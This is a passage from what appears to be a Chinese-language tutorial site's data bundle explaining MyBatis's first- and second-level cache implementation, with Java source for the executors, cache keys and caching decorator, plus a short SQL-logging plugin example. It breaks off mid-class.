}\n            }\n            type = type.getsuperclass();\n        }\n        return interfaces.toarray(new class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# 自定义\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.statementhandler;\nimport cn.mybatis.mapping.boundsql;\nimport cn..mybatis.plugin.interceptor;\nimport cn.mybatis.plugin.intercepts;\nimport cn.mybatis.plugin.invocation;\nimport cn.mybatis.plugin.signature;\n\nimport java.sql.connection;\nimport java.util.properties;\n\n@intercepts({@signature(type = statementhandler.class, method = "prepare", args = {connection.class})})\npublic class testplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        // 获取statementhandler\n        statementhandler statementhandler = (statementhandler) invocation.gettarget();\n        // 获取sql信息\n        boundsql boundsql = statementhandler.getboundsql();\n        string sql = boundsql.getsql();\n        // 输出sql\n        system.out.println("拦截sql：" + sql);\n        // 放行\n        return invocation.proceed();\n    }\n\n    @override\n    public void setproperties(properties properties) {\n        system.out.println("参数输出：" + properties.getproperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0}},{title:"核心功能拆解 一二级缓存原理",frontmatter:{title:"核心功能拆解 一二级缓存原理",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/302.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.html",relativePath:"01.框架/02.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.md",key:"v-f97f0090",path:"/mybatis/mybatis/302/",headers:[{level:2,title:"一级缓存",slug:"一级缓存",normalizedTitle:"一级缓存",charIndex:13},{level:3,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:292},{level:3,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:1214},{level:3,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:1245},{level:2,title:"二级缓存",slug:"二级缓存",normalizedTitle:"二级缓存",charIndex:18},{level:3,title:"解析",slug:"解析-2",normalizedTitle:"解析",charIndex:292},{level:2,title:"准备",slug:"准备-2",normalizedTitle:"准备",charIndex:1214},{level:2,title:"执行",slug:"执行-2",normalizedTitle:"执行",charIndex:1245}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"一级缓存 解析 准备 执行 二级缓存 解析 准备 执行",content:'MyBatis 的缓存分为一级缓存和二级缓存，缓存情况如下图，单服务架构中（有且仅有只有一个程序提供相同服务），一级缓存开启不会影响业务，只会提高性能。 微服务架构中需要关闭一级缓存，原因：Service1 先查询数据，若之后 Service2 修改了数据，之后 Service1 又再次以同样的查询条件查询数据，因走缓存会出现查处的数据不是最新数据\n\n\n\n\n# 一级缓存\n\n一级缓存是基于 SQLSession 级别的，在同一个 Session 的相同查询语句会才会从缓存中查询，所谓相同包括 SQL 相同，条件相同等，那么我们看下在源码中具体是怎么维护和使用这个缓存的。\n\n\n# 解析\n\n描述一级缓存只需要在 <configuration> 标签中描述即可，而一级缓存的 value 值有 SESSION 和 STATEMENT 两种，如果设置为 STATEMENT 关闭一级缓存，一级缓存是 MyBatis 提供的默认缓存\n\n<configuration>\n    <settings>\n        \x3c!--缓存级别：SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="SESSION"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n解析核心代码会得到 localCacheScope的值 ，维护到 configuration 全局配置中\n\nprivate void settingsElement(Element context) {\n    if (context == null) return;\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // 是否启用二级缓存\n    configuration.setCacheEnabled(booleanValueOf(props.getProperty("cacheEnabled"), true));\n    // 一级缓存的配置\n    configuration.setLocalCacheScope(LocalCacheScope.valueOf(props.getProperty("localCacheScope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 准备\n\n准备阶段主要是在 openSession 方法，他会在执行器里面去直接 new PerpetualCache 永久缓存，执行器就拥有了这个缓存对象\n\n// 打开一个 session\n@Override\npublic SqlSession openSession() {\n    Transaction tx = null;\n    try {\n        final Environment environment = configuration.getEnvironment();\n        TransactionFactory transactionFactory = environment.getTransactionFactory();\n        tx = transactionFactory.newTransaction(configuration.getEnvironment().getDataSource(), TransactionIsolationLevel.READ_COMMITTED, false);\n        // 创建执行器\n        final Executor executor = configuration.newExecutor(tx);\n        // 创建DefaultSqlSession\n        return new DefaultSqlSession(configuration, executor);\n    } catch (Exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (SQLException ignore) {\n        }\n        throw new RuntimeException("Error opening session.  Cause: " + e);\n    }\n}\n\n// 创建执行器\npublic Executor newExecutor(Transaction transaction) {\n    Executor executor = new SimpleExecutor(this, transaction);\n    // 配置开启二级缓存，创建 CachingExecutor(默认就是有缓存)装饰者模式，\n    if (cacheEnabled) {\n        executor = new CachingExecutor(executor);\n    }\n    return executor;\n}\n\n// SimpleExecutor 简单执行器的构造方法\npublic class SimpleExecutor extends BaseExecutor {\n    public SimpleExecutor(Configuration configuration, Transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// 基础执行器的构造方法\nprotected BaseExecutor(Configuration configuration, Transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new 一个永久缓存\n    this.localCache = new PerpetualCache("LocalCache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nPerpetualCache 继承了 Cache ，并实现了基本的对缓存的操作\n\npublic class PerpetualCache implements Cache {\n    private String id;\n    // 使用HashMap存放一级缓存数据，session 生命周期较短，正常情况下数据不会一直在缓存存放\n    private Map<Object, Object> cache = new HashMap<>();\n    public PerpetualCache(String id) {\n        this.id = id;\n    }\n    @Override\n    public String getId() {\n        return id;\n    }\n    @Override\n    public void putObject(Object key, Object value) {\n        cache.put(key, value);\n    }\n    @Override\n    public Object getObject(Object key) {\n        return cache.get(key);\n    }\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 执行\n\n在准备阶段已经得到了执行器，并在执行器里面得到了 PerpetualCache 缓存，只需要知道客户使用的是查询还是修改等操作后，执行执行器里面对应的 query or update 方法即可，核心看 query\n\npublic abstract class BaseExecutor implements Executor {\n\n    private org.slf4j.Logger logger = LoggerFactory.getLogger(BaseExecutor.class);\n\n    protected Configuration configuration;\n    protected Transaction transaction;\n    protected Executor wrapper;\n\n    // 本地缓存\n    protected PerpetualCache localCache;\n\n    private boolean closed;\n    // 查询堆栈\n    protected int queryStack = 0;\n\n    protected BaseExecutor(Configuration configuration, Transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localCache = new PerpetualCache("LocalCache");\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        clearLocalCache();\n        return doUpdate(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. 获取绑定SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. 创建缓存Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        // 清理局部缓存，查询堆栈为0则清理。queryStack 避免递归调用清理\n        if (queryStack == 0 && ms.isFlushCacheRequired()) {\n            clearLocalCache();\n        }\n        List<E> list;\n        try {\n            queryStack++;\n            // 根据cacheKey从localCache中查询数据\n            list = resultHandler == null ? (List<E>) localCache.getObject(key) : null;\n            if (list == null) {\n                list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);\n            }\n        } finally {\n            queryStack--;\n        }\n        if (queryStack == 0) {\n            // 如果不是 SESSION 模式，则清除缓存\n            if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) {\n                clearLocalCache();\n            }\n        }\n        return list;\n    }\n\n    private <E> List<E> queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        List<E> list;\n        localCache.putObject(key, ExecutionPlaceholder.EXECUTION_PLACEHOLDER);\n        try {\n            list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);\n        } finally {\n            localCache.removeObject(key);\n        }\n        // 存入缓存\n        localCache.putObject(key, list);\n        return list;\n    }\n\n    protected abstract int doUpdate(MappedStatement ms, Object parameter) throws SQLException;\n\n    protected abstract <E> List<E> doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException;\n\n    @Override\n    public Transaction getTransaction() {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        return transaction;\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Cannot commit, transaction is already closed");\n        }\n        clearLocalCache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        if (!closed) {\n            try {\n                clearLocalCache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        if (!closed) {\n            localCache.clear();\n        }\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        CacheKey cacheKey = new CacheKey();\n        cacheKey.update(ms.getId());\n        cacheKey.update(rowBounds.getOffset());\n        cacheKey.update(rowBounds.getLimit());\n        cacheKey.update(boundSql.getSql());\n        List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n        TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();\n        for (ParameterMapping parameterMapping : parameterMappings) {\n            Object value;\n            String propertyName = parameterMapping.getProperty();\n            if (boundSql.hasAdditionalParameter(propertyName)) {\n                value = boundSql.getAdditionalParameter(propertyName);\n            } else if (parameterObject == null) {\n                value = null;\n            } else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {\n                value = parameterObject;\n            } else {\n                MetaObject metaObject = configuration.newMetaObject(parameterObject);\n                value = metaObject.getValue(propertyName);\n            }\n            cacheKey.update(value);\n        }\n        if (configuration.getEnvironment() != null) {\n            cacheKey.update(configuration.getEnvironment().getId());\n        }\n        return cacheKey;\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            try {\n                rollback(forceRollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (SQLException e) {\n            logger.warn("Unexpected exception on closing transaction.  Cause: " + e);\n        } finally {\n            transaction = null;\n            localCache = null;\n            closed = true;\n        }\n    }\n\n    protected void closeStatement(Statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (SQLException ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n\n\n可以看到 执行器里面维护了 query update commit 等方法，在执行查询的时候会先生成 CacheKey ，会按照 namespace.id + 分页offset + 分页limit + 执行的SQL语句 + 查询条件的值 + 环境ID 生成唯一的 key，然后做为查询缓存的 key，查询结果做为 value，如果同一各 SQLSession 执行相同语句和条件以及分页等，就会从缓存中命中并返回结果。缓存的清除，就是当该 SQLSession 执行 update，commit，close，rollback 时该 SQLSession 就清除缓存。\n\n在 SQL 语句中也可以设置清除缓存，只需要在 <select>、<insert> 和 <update> 等 SQL 标签中设置 flushCache="true" 属性会强制清空本地缓存，使得下次查询时重新从数据库中获取数据。适用于一级缓存和二级缓存\n\n<select id="selectById" resultType="com.example.User" flushCache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n还有就是在 query 查询中，当如果你设置 LocalCacheScope = STATEMENT 时，在 query 也会自动清除缓存，也就是我们所说的关闭一级缓存的方法\n\n\n# 二级缓存\n\n二级缓存是为 Namespace 也叫 mapper 级别的缓存，是跨 SQLSession 的，他会在原有的执行器上封装一个 CachingExecutor ，来管理缓存， CachingExecutor 使用了装饰器模式来装饰基础的 Executor 执行器。\n\n\n# 解析\n\n在二级缓存中的配置方式具体如下\n\n\x3c!-- 必须先开启缓存 --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false 二级缓存是否使用 --\x3e\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- 指定在某个mapper中使用 --\x3e\n<mapper namespace="com.example.MyMapper">\n    \x3c!-- 设置该mapper的二级缓存 --\x3e\n    <cache eviction="LRU" flushInterval="100000" readOnly="true" size="1024"/>\n    \x3c!-- useCache：表示是否使用二级缓存，如果设置为 true，则会使用二级缓存。对于 select 元素，默认值为 true。 --\x3e\n    \x3c!-- useCache 属性只能控制是否使用二级缓存，它不能关闭一级缓存。一级缓存是 MyBatis 的默认行为，它总是开启的，无法关闭。 --\x3e\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中 <cache > 标签有多个属性，这里一一介绍一下：\n\n * type：可以指定自定义缓存，但是该类必须实现，而且是全类名\n * eviction：缓存回收策略，默认为 LRU（Least Recently Used），策略介绍如下：\n   LRU：按照访问时间排序，最近未使用的数据优先清除。\n   FIFO：按照插入时间排序，先插入的数据先清除。\n   SOFT：基于垃圾回收算法，当系统内存不足时，会优先清理不常用的、占用内存较多的数据。\n   WEAK：弱引用机制，当 JVM 进行垃圾回收时，如果判断一个对象只被弱引用指向，则会将其回收。\n * flushInterval：刷新间隔时间，表示多长时间刷新一次缓存，单位为毫秒，默认不刷新。\n * size：缓存的大小，表示最多可以缓存多少个对象。\n * readOnly：是否只读，默认为 false，表示启用缓存更新机制。\n * blocking：是否启用阻塞，默认为 false，表示不启用。\n\n> flushInterval 默认情况下，MyBatis 采用基于 PerpetualCache (永久缓存) 的缓存实现方式，即缓存会一直保存在内存中，直到会话关闭时才被清除。而当我们使用基于 Ehcache 的缓存实现时，可以通过设置 flushInterval 属性控制缓存的刷新时间，即定时将缓存中的数据写入到磁盘或持久化存储中，以避免缓存过期、失效或内存溢出等问题。\n\n当 Mybaits 启动后会读到二级缓存的配置，先会进行 <cache> 基础的解析，得到 XML 里面的属性值，其次用值信息组成一个 Cache 对象，并把这个 Cache 对象维护到全局配置 Configuration 中，该全局配置里面是维护一个 Map 结构的容器\n\n// 开始解析\nprivate void cacheElement(Element context) {\n    if (context == null) return;\n    // 基础配置信息，默认是永恒缓存\n    String type = context.attributeValue("type", "PERPETUAL");\n    Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n    // 缓存队列 FIFO\n    String eviction = context.attributeValue("eviction", "FIFO");\n    Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n    Long flushInterval = Long.valueOf(context.attributeValue("flushInterval"));\n    Integer size = Integer.valueOf(context.attributeValue("size"));\n    boolean readWrite = !Boolean.parseBoolean(context.attributeValue("readOnly", "false"));\n    boolean blocking = !Boolean.parseBoolean(context.attributeValue("blocking", "false"));\n\n    // 解析额外属性信息；<property name="cacheFile" value="/tmp/xxx-cache.tmp"/>\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // 构建缓存\n    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n}\n\n// 构建Cache\npublic Cache useNewCache(Class<? extends Cache> typeClass,\n                        Class<? extends Cache> evictionClass,\n                        Long flushInterval,\n                        Integer size,\n                        boolean readWrite,\n                        boolean blocking,\n                        Properties props) {\n    // 判断为null，则用默认值\n    typeClass = valueOrDefault(typeClass, PerpetualCache.class);\n    evictionClass = valueOrDefault(evictionClass, FifoCache.class);\n\n    // 建造者模式构建 Cache [currentNamespace=cn.bugstack.mybatis.test.dao.IActivityDao]\n    Cache cache = new CacheBuilder(currentNamespace)\n            .implementation(typeClass)\n            .addDecorator(evictionClass)\n            .clearInterval(flushInterval)\n            .size(size)\n            .readWrite(readWrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // 添加缓存\n    configuration.addCache(cache);\n    // 给自己维护一个 cache 以便后续 MappedStatement 用到\n    currentCache = cache;\n    return cache;\n}\n\n// 添加到 configuration全局配置维护的 caches中\npublic class Configuration {\n    // 缓存,存在Map里\n    protected final Map<String, Cache> caches = new HashMap<>();\n    public void addCache(Cache cache) {\n        caches.put(cache.getId(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n缓存解析过了，但是最主要的还是 <select> 标签着一些，标签上面描述了具体的缓存是否使用，缓存是否清除，所以还需要解析标签上的缓存信息，主要是 flushCache 和 useCache 这两个属性\n\n// 解析操作\npublic void parseStatementNode() {\n    String id = element.attributeValue("id");\n    // 参数类型\n    String parameterType = element.attributeValue("parameterType");\n    Class<?> parameterTypeClass = resolveAlias(parameterType);\n    // 外部应用 resultMap\n    String resultMap = element.attributeValue("resultMap");\n    // 结果类型\n    String resultType = element.attributeValue("resultType");\n    Class<?> resultTypeClass = resolveAlias(resultType);\n    // 获取命令类型(select|insert|update|delete)\n    String nodeName = element.getName();\n    SqlCommandType sqlCommandType = SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));\n\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n    boolean flushCache = Boolean.parseBoolean(element.attributeValue("flushCache", String.valueOf(!isSelect)));\n    boolean useCache = Boolean.parseBoolean(element.attributeValue("useCache", String.valueOf(isSelect)));\n\n    // 获取默认语言驱动器\n    Class<?> langClass = configuration.getLanguageRegistry().getDefaultDriverClass();\n    LanguageDriver langDriver = configuration.getLanguageRegistry().getDriver(langClass);\n\n    // 解析<selectKey> step-14 新增\n    processSelectKeyNodes(id, parameterTypeClass, langDriver);\n\n    // 解析成SqlSource，DynamicSqlSource/RawSqlSource\n    SqlSource sqlSource = langDriver.createSqlSource(configuration, element, parameterTypeClass);\n\n    // 属性标记【仅对 insert 有用】, MyBatis 会通过 getGeneratedKeys 或者通过 insert 语句的 selectKey 子元素设置它的值 step-14 新增\n    String keyProperty = element.attributeValue("keyProperty");\n\n    KeyGenerator keyGenerator = null;\n    String keyStatementId = id + SelectKeyGenerator.SELECT_KEY_SUFFIX;\n    keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, true);\n\n    if (configuration.hasKeyGenerator(keyStatementId)) {\n        keyGenerator = configuration.getKeyGenerator(keyStatementId);\n    } else {\n        keyGenerator = configuration.isUseGeneratedKeys() && SqlCommandType.INSERT.equals(sqlCommandType) ? new Jdbc3KeyGenerator() : new NoKeyGenerator();\n    }\n    // 调用助手类\n    builderAssistant.addMappedStatement(id,\n            sqlSource,\n            sqlCommandType,\n            parameterTypeClass,\n            resultMap,\n            resultTypeClass,\n            flushCache,\n            useCache,\n            keyGenerator,\n            keyProperty,\n            langDriver);\n}\n\n// 把信息添加到 MappedStatement对象\npublic MappedStatement addMappedStatement(\n        String id,\n        SqlSource sqlSource,\n        SqlCommandType sqlCommandType,\n        Class<?> parameterType,\n        String resultMap,\n        Class<?> resultType,\n        boolean flushCache,\n        boolean useCache,\n        KeyGenerator keyGenerator,\n        String keyProperty,\n        LanguageDriver lang\n) {\n    // 给id加上namespace前缀：cn.bugstack.mybatis.test.dao.IUserDao.queryUserInfoById\n    id = applyCurrentNamespace(id, false);\n    //是否是select语句\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n\n    MappedStatement.Builder statementBuilder = new MappedStatement.Builder(configuration, id, sqlCommandType, sqlSource, resultType);\n    statementBuilder.resource(resource);\n    statementBuilder.keyGenerator(keyGenerator);\n    statementBuilder.keyProperty(keyProperty);\n\n    // 结果映射，给 MappedStatement#resultMaps\n    setStatementResultMap(resultMap, resultType, statementBuilder);\n    // 维护缓存信息\n    setStatementCache(isSelect, flushCache, useCache, currentCache, statementBuilder);\n    MappedStatement statement = statementBuilder.build();\n    // 映射语句信息，建造完存放到配置项中\n    configuration.addMappedStatement(statement);\n    return statement;\n}\n\n// 给Statement添加缓存信息\nprivate void setStatementCache(\n        boolean isSelect,\n        boolean flushCache,\n        boolean useCache,\n        Cache cache,\n        MappedStatement.Builder statementBuilder) {\n    flushCache = valueOrDefault(flushCache, !isSelect);\n    useCache = valueOrDefault(useCache, isSelect);\n    statementBuilder.flushCacheRequired(flushCache);\n    statementBuilder.useCache(useCache);\n    statementBuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\n在具体的 addMappedStatement 的时候，可以看到会得到一个 MappedStatement 对象，该对象就是封装了 SQL 标签的所有信息，在 setStatementCache 方法中，不仅只把 flushCache和useCache 进行了设置，额外的还带有一个 cache ，该 cache 就是在调用 useNewCache 方法，内部赋值的 currentCache ，他们的方法是在同一个类中，因此可以使用。这样 MappedStatement 对象也就拥有了 <cache> 标签的能力，到此解析完毕\n\n\n# 准备\n\n和一级缓存一样，都是在 openSession 的时候去做实例化，但是不同的是，二级缓存会在一级缓存上进行一个装饰，并且首要会判断是否允许开启二级缓存。\n\nif (cacheEnabled) {\n    executor = new CachingExecutor(executor);\n}\n\n\n1\n2\n3\n\n\nCachingExecutor 接收 executor ，并对其进行包装，内部方法依然调用的是 BaseExecutor 的相关方法。 CachingExecutor 内部还维护了 TransactionalCacheManager 事务缓存管理器，该管理器内部维护 Map<Cache, TransactionalCache> ， TransactionalCache 内部又维护了 Cache 以及 entriesMissedInCache 和 entriesToAddOnCommit\n\n\n# 执行\n\npublic class CachingExecutor implements Executor {\n\n    private Logger logger = LoggerFactory.getLogger(CachingExecutor.class);\n    private Executor delegate;\n    // 事务缓存管理器\n    private TransactionalCacheManager tcm = new TransactionalCacheManager();\n\n    public CachingExecutor(Executor delegate) {\n        this.delegate = delegate;\n        delegate.setExecutorWrapper(this);\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        return delegate.update(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        Cache cache = ms.getCache();\n        if (cache != null) {\n            flushCacheIfRequired(ms);\n            if (ms.isUseCache() && resultHandler == null) {\n                @SuppressWarnings("unchecked")\n                List<E> list = (List<E>) tcm.getObject(cache, key);\n                if (list == null) {\n                    list = delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n                    // cache：缓存队列实现类，FIFO\n                    // key：哈希值 [mappedStatementId + offset + limit + SQL + queryParams + environment]\n                    // list：查询的数据\n                    tcm.putObject(cache, key, list);\n                }\n                // 打印调试日志，记录二级缓存获取数据\n                if (logger.isDebugEnabled() && cache.getSize() > 0) {\n                    logger.debug("二级缓存：{}", JSON.toJSONString(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. 获取绑定SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. 创建缓存Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public Transaction getTransaction() {\n        return delegate.getTransaction();\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            if (forceRollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forceRollback);\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        delegate.clearLocalCache();\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        return delegate.createCacheKey(ms, parameterObject, rowBounds, boundSql);\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        throw new UnsupportedOperationException("This method should not be called");\n    }\n\n    private void flushCacheIfRequired(MappedStatement ms) {\n        Cache cache = ms.getCache();\n        if (cache != null && ms.isFlushCacheRequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class TransactionalCacheManager {\n\n    private Map<Cache, TransactionalCache> transactionalCaches = new HashMap<>();\n\n    public void clear(Cache cache) {\n        